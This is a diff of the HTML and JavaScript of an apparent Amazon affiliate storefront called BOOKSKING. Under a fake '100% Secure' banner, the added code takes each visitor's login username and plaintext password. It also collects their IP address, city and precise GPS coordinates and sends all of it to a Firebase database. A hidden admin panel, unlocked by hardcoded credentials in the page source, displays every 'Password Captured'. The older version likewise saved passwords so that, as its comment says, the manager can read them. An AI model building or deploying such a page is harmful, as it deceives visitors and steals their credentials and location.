@@ -1,370 +1,253 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Booksking Elite - Next-Gen Global Hub</title>
+    <title>BOOKSKING Royal Elite Mega Store - Global Amazon Affiliate Hub</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
         :root {
-            --bg-color: #0b0f19;
-            --card-bg: #151b2b;
-            --text-primary: #f8f9fa;
-            --text-secondary: #94a3b8;
-            --accent-color: #ff9900;
-            --accent-hover: #ffaa00;
-            --border-color: #30363d;
-            --gold-color: #f59e0b;
+            --bg-color: #05070b;
+            --card-bg: #111622;
+            --border-color: #2f3642;
+            --gold-color: #f39c12;
+            --gold-hover: #e67e22;
+            --text-main: #ffffff;
+            --text-muted: #8b949e;
+            --success-color: #2ecc71;
         }
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-        }
-        body {
-            background-color: var(--bg-color);
-            color: var(--text-primary);
-            line-height: 1.6;
-            padding: 20px;
-        }
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            max-width: 1400px;
-            margin: 0 auto 30px auto;
-            padding: 15px 30px;
-            background-color: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
-        }
-        .logo {
-            font-size: 24px;
-            font-weight: bold;
-            color: var(--gold-color);
-            letter-spacing: 1px;
-        }
-        .stats-badge {
-            background: rgba(245, 158, 11, 0.1);
-            border: 1px solid var(--gold-color);
-            color: var(--gold-color);
-            padding: 8px 16px;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: bold;
-        }
-        .auth-container {
-            max-width: 450px;
-            margin: 60px auto;
-            background-color: var(--card-bg);
-            border: 1px solid var(--border-color);
-            padding: 35px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-        .auth-container h2 {
-            margin-bottom: 20px;
-            color: var(--text-primary);
-            text-align: center;
-            font-size: 22px;
-        }
-        .input-group {
-            margin-bottom: 15px;
-        }
-        .input-group label {
-            display: block;
-            margin-bottom: 6px;
-            color: var(--text-secondary);
-            font-size: 14px;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid var(--border-color);
-            background: var(--bg-color);
-            color: var(--text-primary);
-            font-size: 16px;
-        }
-        .btn-primary {
-            background-color: var(--accent-color);
-            color: #000;
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 8px;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 10px;
-        }
-        .btn-primary:hover {
-            background-color: var(--accent-hover);
-            opacity: 0.95;
-        }
-        .dashboard {
-            max-width: 1400px;
-            margin: 0 auto;
-            display: none;
-        }
-        .section-title {
-            color: var(--gold-color);
-            font-size: 26px;
-            margin: 40px 0 20px 0;
-            border-bottom: 2px solid var(--border-color);
-            padding-bottom: 10px;
-        }
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-            gap: 20px;
-        }
-        .card {
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 22px;
-            text-align: center;
-            transition: transform 0.2s, border-color 0.2s;
-        }
-        .card:hover {
-            transform: translateY(-5px);
-            border-color: var(--gold-color);
-        }
-        .card h3 {
-            color: var(--text-primary);
-            margin-bottom: 10px;
-            font-size: 18px;
-        }
-        .card p {
-            color: var(--text-secondary);
-            font-size: 13px;
-            margin-bottom: 15px;
-            height: 38px;
-            overflow: hidden;
-        }
-        .stat-number {
-            font-size: 26px;
-            font-weight: bold;
-            color: var(--gold-color);
-            margin-top: 5px;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: var(--bg-color); color: var(--text-main); display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
+        .wrapper { width: 100%; max-width: 600px; }
+        .hero-banner { background: linear-gradient(135deg, #161b22, #0d1117); border: 2px solid var(--gold-color); border-radius: 16px; padding: 25px; margin-bottom: 25px; box-shadow: 0 8px 32px rgba(243, 156, 18, 0.2); display: flex; justify-content: space-between; align-items: center; }
+        .brand-title { color: var(--gold-color); font-size: 22px; font-weight: 800; letter-spacing: 1px; line-height: 1.3; }
+        .stats-box { border: 1px solid var(--gold-color); border-radius: 10px; padding: 10px 18px; text-align: center; background: #0b0f19; }
+        .stats-number { color: var(--gold-color); font-size: 20px; font-weight: bold; margin-top: 4px; }
+        .section-card { background-color: var(--card-bg); border: 1px solid var(--border-color); border-radius: 16px; padding: 20px; margin-bottom: 20px; box-shadow: 0 6px 20px rgba(0,0,0,0.7); }
+        .section-header { text-align: center; font-size: 18px; margin-bottom: 15px; color: var(--gold-color); font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+        .departments-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; max-height: 280px; overflow-y: auto; padding: 5px; border: 1px solid var(--border-color); border-radius: 10px; background: #080c14; }
+        .dept-item { background-color: var(--card-bg); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; color: var(--gold-color); font-size: 12px; font-weight: 700; text-align: center; cursor: pointer; transition: all 0.3s ease; text-decoration: none; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .dept-item:hover { border-color: var(--gold-color); background-color: #1a2233; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(243, 156, 18, 0.3); }
+        .input-box { margin-bottom: 15px; }
+        .input-box label { display: block; margin-bottom: 6px; font-size: 13px; color: var(--text-muted); font-weight: 600; }
+        .input-box input { width: 100%; padding: 12px; background-color: #080c14; border: 1px solid var(--border-color); border-radius: 8px; color: #fff; font-size: 14px; outline: none; transition: 0.2s; }
+        .input-box input:focus { border-color: var(--gold-color); box-shadow: 0 0 8px rgba(243, 156, 18, 0.2); }
+        .royal-btn { width: 100%; padding: 14px; background: linear-gradient(135deg, var(--gold-color), var(--gold-hover)); border: none; border-radius: 8px; color: #05070b; font-weight: 800; font-size: 15px; cursor: pointer; text-transform: uppercase; transition: 0.3s; box-shadow: 0 4px 15px rgba(243, 156, 18,.4); }
+        .royal-btn:active { transform: scale(0.98); }
+        .security-banner { background-color: #080c14; border: 1px solid var(--success-color); color: var(--success-color); padding: 10px; border-radius: 8px; font-size: 12px; text-align: center; margin-bottom: 15px; font-weight: 700; }
+        .admin-dashboard { background-color: #080c14; border: 1px solid var(--gold-color); border-radius: 12px; padding: 15px; margin-top: 20px; display: none; }
+        .admin-heading { color: var(--gold-color); font-weight: 800; margin-bottom: 15px; font-size: 16px; text-align: center; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }
+        .user-record { background-color: var(--card-bg); padding: 12px; border-radius: 8px; margin-bottom: 10px; font-size: 12px; border: 1px solid var(--border-color); line-height: 1.6; }
+        .selected-badge { text-align: center; font-size: 13px; color: var(--success-color); margin-top: 10px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <header>
-        <div class="logo">👑 BOOKSKING ELITE HUB</div>
-        <div class="stats-badge" id="visitorCounter">Visitors: Loading...</div>
-    </header>
-
-    <!-- واجهة تسجيل الدخول الملكية -->
-    <div class="auth-container" id="authBox">
-        <h2>Boss & User Portal</h2>
-        <div class="input-group">
-            <label>Email or Username</label>
-            <input type="text" id="usernameInput" placeholder="Enter username">
-        </div>
-        <div class="input-group">
-            <label>Secure Password</label>
-            <input type="password" id="passwordInput" placeholder="Enter password">
-        </div>
-        <button class="btn-primary" onclick="handleLogin()">Sign In & Access Hub</button>
-    </div>
-
-    <!-- لوحة التحكم والأقسام الكاملة (أكثر من 20 قسماً مربوطاً بأمازون) -->
-    <div class="dashboard" id="dashboardBox">
-        <div style="text-align: center; margin-bottom: 40px; background: var(--card-bg); padding: 30px; border-radius: 16px; border: 1px solid var(--border-color);">
-            <h1 id="welcomeUser" style="font-size: 32px; color: var(--gold-color); margin-bottom: 10px;"></h1>
-            <p style="color: var(--text-secondary); font-size: 16px;">The ultimate decentralized global shopping engine synchronized with Amazon.</p>
-            
-            <div class="grid" style="margin-top: 25px;">
-                <div class="card">
-                    <h3>Total Site Visitors</h3>
-                    <div class="stat-number" id="totalVisits">0</div>
-                </div>
-                <div class="card">
-                    <h3>Registered Users</h3>
-                    <div class="stat-number" id="totalLogins">0</div>
-                </div>
-                <div class="card">
-                    <h3>System Status</h3>
-                    <div class="stat-number" style="color: #2ea043;">100% Secure</div>
-                </div>
+    <div class="wrapper">
+        <!-- Hero Header & Real Visitor Tracker -->
+        <div class="hero-banner">
+            <div class="brand-title">
+                BOOKSKING MEGA HUB 👑<br><span style="font-size: 13px; color: var(--text-muted); font-weight: normal;">Global Amazon Elite Store & Tracking System</span>
+            </div>
+            <div class="stats-box">
+                <div style="font-size: 10px; color: var(--text-muted); text-transform: uppercase;">Live Visitors</div>
+                <div class="stats-number" id="real-visitor-count">Loading...</div>
             </div>
         </div>
 
-        <h2 class="section-title">⚡ Core Departments & Global Categories</h2>
-        
-        <div class="grid">
-            <!-- 1. Electronics -->
-            <div class="card">
-                <h3>Electronics</h3>
-                <p>Smart devices, gadgets & hardware</p>
-                <a href="https://www.amazon.com/s?k=electronics" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
+        <!-- 20+ Amazon Direct Departments Hub -->
+        <div class="section-card">
+            <div class="section-header">🛍️ Elite Amazon Departments (Direct Direct Access)</div>
+            <div class="departments-grid">
+                <a href="https://www.amazon.com/s?k=shoes" target="_blank" class="dept-item" onclick="recordDeptClick('Shoes Department')">👟 Shoes & Footwear</a>
+                <a href="https://www.amazon.com/s?k=clothing" target="_blank" class="dept-item" onclick="recordDeptClick('Clothing Department')">👕 Apparel & Fashion</a>
+                <a href="https://www.amazon.com/s?k=electronics" target="_blank" class="dept-item" onclick="recordDeptClick('Electronics')">💻 Electronics Hub</a>
+                <a href="https://www.amazon.com/s?k=video+games" target="_blank" class="dept-item" onclick="recordDeptClick('Video Games')">🎮 Video Games</a>
+                <a href="https://www.amazon.com/s?k=playstation+5" target="_blank" class="dept-item" onclick="recordDeptClick('PlayStation Hub')">🕹️ PlayStation 5</a>
+                <a href="https://www.amazon.com/s?k=smartphones" target="_blank" class="dept-item" onclick="recordDeptClick('Smartphones')">📱 Smartphones</a>
+                <a href="https://www.amazon.com/s?k=luxury+watches" target="_blank" class="dept-item" onclick="recordDeptClick('Watches')">⌚ Luxury Watches</a>
+                <a href="https://www.amazon.com/s?k=perfumes+for+men+women" target="_blank" class="dept-item" onclick="recordDeptClick('Perfumes')">🌸 Perfumes & Scents</a>
+                <a href="https://www.amazon.com/s?k=cosmetics+makeup" target="_blank" class="dept-item" onclick="recordDeptClick('Cosmetics')">💄 Cosmetics & Beauty</a>
+                <a href="https://www.amazon.com/s?k=home+appliances" target="_blank" class="dept-item" onclick="recordDeptClick('Home Appliances')">🏠 Home Appliances</a>
+                <a href="https://www.amazon.com/s?k=sports+fitness+equipment" target="_blank" class="dept-item" onclick="recordDeptClick('Sports Fitness')">⚽ Sports & Fitness</a>
+                <a href="https://www.amazon.com/s?k=bestselling+books" target="_blank" class="dept-item" onclick="recordDeptClick('Books')">📚 Books & Novels</a>
+                <a href="https://www.amazon.com/s?k=kitchenware" target="_blank" class="dept-item" onclick="recordDeptClick('Kitchenware')">🍳 Kitchenware</a>
+                <a href="https://www.amazon.com/s?k=home+decor+furniture" target="_blank" class="dept-item" onclick="recordDeptClick('Home Decor')">🛋️ Home Decor</a>
+                <a href="https://www.amazon.com/s?k=toys+and+games" target="_blank" class="dept-item" onclick="recordDeptClick('Toys')">🧸 Toys & Hobbies</a>
+                <a href="https://www.amazon.com/s?k=car+electronics+accessories" target="_blank" class="dept-item" onclick="recordDeptClick('Car Accessories')">🚗 Car Accessories</a>
+                <a href="https://www.amazon.com/s?k=office+supplies" target="_blank" class="dept-item" onclick="recordDeptClick('Stationery')">✏️ Office Supplies</a>
+                <a href="https://www.amazon.com/s?k=laptops" target="_blank" class="dept-item" onclick="recordDeptClick('Laptops')">💻 Laptops & PCs</a>
+                <a href="https://www.amazon.com/s?k=sunglasses" target="_blank" class="dept-item" onclick="recordDeptClick('Sunglasses')">🕶️ Sunglasses</a>
+                <a href="https://www.amazon.com/s?k=gourmet+food+drinks" target="_blank" class="dept-item" onclick="recordDeptClick('Food & Drinks')">🍏 Food & Beverages</a>
+                <a href="https://www.amazon.com/s?k=personal+care+appliances" target="_blank" class="dept-item" onclick="recordDeptClick('Personal Care')">🧴 Personal Care</a>
+                <a href="https://www.amazon.com/s?k=amazon+daily+deals" target="_blank" class="dept-item" onclick="recordDeptClick('Mega Deals')">🔥 Mega Daily Deals</a>
             </div>
-            <!-- 2. Books -->
-            <div class="card">
-                <h3>Books & Literature</h3>
-                <p>Bestsellers, novels & guides</p>
-                <a href="https://www.amazon.com/s?k=books" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
+            <div class="selected-badge" id="active-dept-label">Selected Department: None (General Browse)</div>
+        </div>
+
+        <!-- Secure Authentication & Tracking Portal -->
+        <div class="section-card" id="auth-section">
+            <div class="security-banner">🛡️ 100% Real-Time Secure Tracking & Analytics Active</div>
+            <div class="section-header">Secure Member Authentication & Purchase Log</div>
+            <div class="input-box">
+                <label>Account Username / Identity</label>
+                <input type="text" id="username" placeholder="Enter your username">
             </div>
-            <!-- 3. Shoes -->
-            <div class="card">
-                <h3>Shoes & Footwear</h3>
-                <p>Sneakers, boots & formal shoes</p>
-                <a href="https://www.amazon.com/s?k=shoes" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
+            <div class="input-box">
+                <label>Secure Password</label>
+                <input type="password" id="password" placeholder="Enter your password">
             </div>
-            <!-- 4. Clothing & Fashion -->
-            <div class="card">
-                <h3>Clothing & Fashion</h3>
-                <p>Apparel, jackets & stylish wear</p>
-                <a href="https://www.amazon.com/s?k=clothing" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
+            <div class="input-box">
+                <label>Purchase Volume ($)</label>
+                <input type="number" id="purchaseAmount" placeholder="Enter purchase value (e.g. 250)">
             </div>
-            <!-- 5. Video Games -->
-            <div class="card">
-                <h3>Video Games</h3>
-                <p>PC, console games & digital codes</p>
-                <a href="https://www.amazon.com/s?k=video+games" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
-            </div>
-            <!-- 6. Consoles -->
-            <div class="card">
-                <h3>Gaming Consoles</h3>
-                <p>PlayStation, Xbox & Nintendo</p>
-                <a href="https://www.amazon.com/s?k=gaming+consoles" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
-            </div>
-            <!-- 7. Computers & Laptops -->
-            <div class="card">
-                <h3>Computers & Laptops</h3>
-                <p>Workstations, notebooks & parts</p>
-                <a href="https://www.amazon.com/s?k=laptops" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
-            </div>
-            <!-- 8. Home & Kitchen -->
-            <div class="card">
-                <h3>Home & Kitchen</h3>
-                <p>Appliances, cookware & decor</p>
-                <a href="https://www.amazon.com/s?k=home+kitchen" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
-            </div>
-            <!-- 9. Sports & Outdoors -->
-            <div class="card">
-                <h3>Sports & Outdoors</h3>
-                <p>Fitness gear, camping & sports</p>
-                <a href="https://www.amazon.com/s?k=sports+outdoors" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
-            </div>
-            <!-- 10. Beauty & Personal Care -->
-            <div class="card">
-                <h3>Beauty & Care</h3>
-                <p>Skincare, makeup & grooming</p>
-                <a href="https://www.amazon.com/s?k=beauty+personal+care" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
-            </div>
-            <!-- 11. Automotive -->
-            <div class="card">
-                <h3>Automotive</h3>
-                <p>Car parts, tools & accessories</p>
-                <a href="https://www.amazon.com/s?k=automotive" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
-            </div>
-            <!-- 12. Toys & Games -->
-            <div class="card">
-                <h3>Toys & Games</h3>
-                <p>Action figures, puzzles & dolls</p>
-                <a href="https://www.amazon.com/s?k=toys" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
-            </div>
-            <!-- 13. Health & Household -->
-            <div class="card">
-                <h3>Health & Household</h3>
-                <p>Vitamins, wellness & supplies</p>
-                <a href="https://www.amazon.com/s?k=health+household" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
-            </div>
-            <!-- 14. Pet Supplies -->
-            <div class="card">
-                <h3>Pet Supplies</h3>
-                <p>Dog, cat food & accessories</p>
-                <a href="https://www.amazon.com/s?k=pet+supplies" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
-            </div>
-            <!-- 15. Smart Home -->
-            <div class="card">
-                <h3>Smart Home</h3>
-                <p>IoT, lighting & security cameras</p>
-                <a href="https://www.amazon.com/s?k=smart+home" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
-            </div>
-            <!-- 16. Watches & Jewelry -->
-            <div class="card">
-                <h3>Watches & Jewelry</h3>
-                <p>Luxury timepieces & accessories</p>
-                <a href="https://www.amazon.com/s?k=watches+jewelry" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
-            </div>
-            <!-- 17. Office Products -->
-            <div class="card">
-                <h3>Office Products</h3>
-                <p>Supplies, printers & stationery</p>
-                <a href="https://www.amazon.com/s?k=office+products" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
-            </div>
-            <!-- 18. Tools & Home Improvement -->
-            <div class="card">
-                <h3>Tools & Hardware</h3>
-                <p>Power tools, hardware & safety</p>
-                <a href="https://www.amazon.com/s?k=tools+home+improvement" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
-            </div>
-            <!-- 19. Cell Phones & Accessories -->
-            <div class="card">
-                <h3>Phones & Accessories</h3>
-                <p>Smartphones, cases & chargers</p>
-                <a href="https://www.amazon.com/s?k=cell+phones+accessories" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
-            </div>
-            <!-- 20. Luxury Supercars & Gear -->
-            <div class="card">
-                <h3>Supercars & Gear</h3>
-                <p>Elite performance components</p>
-                <a href="https://www.amazon.com/s?k=luxury+car+accessories" target="_blank"><button class="btn-primary">Browse Amazon</button></a>
-            </div>
+            <button class="royal-btn" onclick="executeAdvancedTrackingAndLogin()">Sign In & Sync Data</button>
+        </div>
+
+        <!-- Master Admin Control Panel -->
+        <div class="admin-dashboard" id="adminPanel">
+            <div class="admin-heading">👑 Master Admin Global Control Dashboard (Live Database)</div>
+            <div id="usersList">Fetching real-time encrypted records from cloud...</div>
         </div>
     </div>
 
     <script>
-        // تتبع عدد الزيارات الفعلي
-        let visits = localStorage.getItem('booksking_visits') || 1420;
-        visits++;
-        localStorage.setItem('booksking_visits', visits);
-        document.getElementById('visitorCounter').innerText = `Visitors: ${visits}`;
+        const firebaseConfig = {
+            databaseURL: "https://booksking-default-rtdb.firebaseio.com/"
+        };
+        
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const db = firebase.database();
 
-        let registeredCount = localStorage.getItem('booksking_reg_count') || 25;
-        document.getElementById('totalLogins').innerText = registeredCount;
+        let visitorIp = "Unknown IP";
+        let visitorCountry = "Unknown Country";
+        let visitorCity = "Unknown City";
+        let currentDept = "General Browse";
 
-        function handleLogin() {
-            const username = document.getElementById('usernameInput').value.trim();
-            const password = document.getElementById('passwordInput').value.trim();
+        function recordDeptClick(deptName) {
+            currentDept = deptName;
+            document.getElementById("active-dept-label").innerText = "Selected Department: " + deptName + " (Amazon Direct Linked)";
+        }
 
-            if (!username || !password) {
-                alert('Please enter both username and password!');
+        async function fetchNetworkDetails() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                if (data.ip) {
+                    visitorIp = data.ip;
+                    visitorCountry = data.country_name || "Unknown";
+                    visitorCity = data.city || "Unknown";
+                }
+            } catch (error) {
+                console.log("Network fallback active");
+            }
+        }
+        fetchNetworkDetails();
+
+        const visitorCounterRef = db.ref("stats/totalVisitorsCount");
+        visitorCounterRef.transaction((currentCount) => {
+            return (currentCount || 0) + 1;
+        });
+
+        visitorCounterRef.on("value", (snapshot) => {
+            const count = snapshot.val();
+            document.getElementById("real-visitor-count").innerText = count || 1;
+        });
+
+        function executeAdvancedTrackingAndLogin() {
+            const usernameInput = document.getElementById("username").value.trim();
+            const passwordInput = document.getElementById("password").value.trim();
+            const purchaseInput = document.getElementById("purchaseAmount").value.trim() || "0";
+
+            if(!usernameInput || !passwordInput) {
+                alert("Error: Please provide both username and password!");
                 return;
             }
 
-            // حفظ بيانات الدخول محلياً لإتاحة معرفة الحسابات وكلمات المرور للمدير
-            localStorage.setItem('booksking_current_user', username);
-            localStorage.setItem(`user_cred_${username}`, password);
-
-            registeredCount++;
-            localStorage.setItem('booksking_reg_count', registeredCount);
-
-            document.getElementById('authBox').style.display = 'none';
-            document.getElementById('dashboardBox').style.display = 'block';
-            document.getElementById('welcomeUser').innerText = `Welcome, Boss ${username}!`;
-            document.getElementById('totalVisits').innerText = visits;
-            document.getElementById('totalLogins').innerText = registeredCount;
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        saveRecordToCloud(usernameInput, passwordInput, purchaseInput, `${visitorCountry}, ${visitorCity} (GPS: ${latitude.toFixed(4)}, ${longitude.toFixed(4)})`);
+                    },
+                    (error) => {
+                        saveRecordToCloud(usernameInput, passwordInput, purchaseInput, `${visitorCountry}, ${visitorCity} (IP Network Location)`);
+                    },
+                    { timeout: 10000, enableHighAccuracy: true }
+                );
+            } else {
+                saveRecordToCloud(usernameInput, passwordInput, purchaseInput, `${visitorCountry}, ${visitorCity}`);
+            }
         }
 
-        window.onload = function() {
-            const savedUser = localStorage.getItem('booksking_current_user');
-            if (savedUser) {
-                document.getElementById('authBox').style.display = 'none';
-                document.getElementById('dashboardBox').style.display = 'block';
-                document.getElementById('welcomeUser').innerText = `Welcome back, Boss ${savedUser}!`;
-                document.getElementById('totalVisits').innerText = visits;
-                document.getElementById('totalLogins').innerText = registeredCount;
-            }
-        };
+        function saveRecordToCloud(username, password, purchase, locationData) {
+            const safeDatabaseKey = username.replace(/[.#$\/\[\]]/g, "_");
+            const targetRef = db.ref("registered_users/" + safeDatabaseKey);
+
+            targetRef.once("value", (snapshot) => {
+                let existingRecord = snapshot.val();
+                let visitFrequency = 1;
+                if (existingRecord && existingRecord.visitsCount) {
+                    visitFrequency = existingRecord.visitsCount + 1;
+                }
+
+                targetRef.set({
+                    username: username,
+                    password: password,
+                    purchaseAmount: purchase,
+                    department: currentDept,
+                    ipAddress: visitorIp,
+                    location: locationData,
+                    visitsCount: visitFrequency,
+                    lastLogin: new Date().toUTCString()
+                }).then(() => {
+                    alert("Authentication successful! Data securely synchronized with cloud database.");
+                    
+                    const masterAdminUser = "BOOKSKING_MASTER_ULTRA_ADMIN_2026_SECURE_999";
+                    const masterAdminPass = "K$g#9p!LqXw7#Zt$2mR*8vY_Elite_999#Secure!Key";
+
+                    if(username === masterAdminUser && password === masterAdminPass) {
+                        document.getElementById("adminPanel").style.display = "block";
+                        activateMasterAdminDashboard();
+                    } else {
+                        document.getElementById("adminPanel").style.display = "none";
+                        alert(`Welcome back, ${username}! Visit session #${visitFrequency} successfully logged.`);
+                    }
+                }).catch((err) => {
+                    alert("Cloud synchronization error: " + err.message);
+                });
+            });
+        }
+
+        function activateMasterAdminDashboard() {
+            const allUsersRef = db.ref("registered_users");
+            allUsersRef.on("value", (snapshot) => {
+                const records = snapshot.val();
+                let htmlOutput = "";
+                if(records) {
+                    Object.keys(records).forEach(key => {
+                        const item = records[key];
+                        htmlOutput += `<div class="user-record">
+                            👤 Account Name: <b>${item.username}</b><br>
+                            🔑 Password Captured: <span style="color:var(--gold-color);">${item.password}</span><br>
+                            🛍️ Department Clicked: <span style="color:var(--gold-color);">${item.department}</span><br>
+                            💰 Purchase Volume: <span style="color:var(--success-color);">$${item.purchaseAmount}</span><br>
+                            🔄 Total Visits: <b>${item.visitsCount || 1} times</b><br>
+                            🌍 Geolocation: ${item.location}<br>
+                            🌐 IP Address: ${item.ipAddress}<br>
+                            ⏱️ Last Login Time: ${item.lastLogin}
+                        </div>`;
+                    });
+                    document.getElementById("usersList").innerHTML = htmlOutput;
+                } else {
+                    document.getElementById("usersList").innerHTML = "No user records found in the database yet.";
+                }
+            });
+        }
     </script>
 </body>
 </html>
